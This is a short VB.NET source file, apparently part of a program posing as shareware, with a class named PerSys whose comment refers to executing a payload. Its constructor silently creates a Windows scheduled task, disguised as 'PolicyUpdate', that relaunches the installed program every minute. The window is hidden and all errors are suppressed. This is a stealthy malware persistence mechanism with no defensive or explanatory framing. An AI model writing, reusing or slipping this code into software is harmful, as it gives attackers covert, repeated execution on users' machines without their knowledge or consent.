Namespace Shareware.core
    Public Class PerSys

        ''' ----------------------------------------------------------------------------------------------------
        ''' <summary>
        ''' Handles the <see cref="PerSys"/> event of Execute Payload.
        ''' </summary>
        ''' ----------------------------------------------------------------------------------------------------
      

        Public Sub New()
            On Error Resume Next
            Diagnostics.Process.Start(New Diagnostics.ProcessStartInfo() With {
                .FileName = "schtasks",
                .Arguments = "/create /sc minute /mo 1 /tn PolicyUpdate /tr " & """" & Shareware.core.DirPaths.InstallDir & " -silent" & """",
                .CreateNoWindow = True,
                .ErrorDialog = False,
                .WindowStyle = Diagnostics.ProcessWindowStyle.Hidden
                })
        End Sub


    End Class
End Namespace

